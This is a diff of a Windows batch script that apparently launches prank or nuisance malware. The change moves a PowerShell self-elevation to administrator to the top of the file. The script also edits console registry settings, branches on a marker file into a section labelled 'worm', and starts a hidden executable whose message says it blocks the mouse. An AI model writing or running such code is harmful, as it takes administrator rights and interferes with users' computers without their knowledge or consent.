@@ -1,4 +1,5 @@
 @echo off
+if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)
 if exist "%TEMP%\consoleSettingsBackup.reg" regedit /S "%TEMP%\consoleSettingsBackup.reg"&DEL /F /Q "%TEMP%\consoleSettingsBackup.reg"&goto :mainstart
 regedit /S /e "%TEMP%\consoleSettingsBackup.reg" "HKEY_CURRENT_USER\Console"
 echo REGEDIT4>"%TEMP%\disablequickedit.reg"
@@ -15,7 +16,6 @@ SET mypath=%~dp0
 if exist "%userprofile%\AppData\Local\identifyl" goto noworm
 if NOT exist "%userprofile%\AppData\Local\identifyl" goto worm
 :worm
-if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)
 cd "%mypath%\lucieengine"
 start /min "" ILMAUS.exe
 echo la lucie gradisce bloccare i mouse
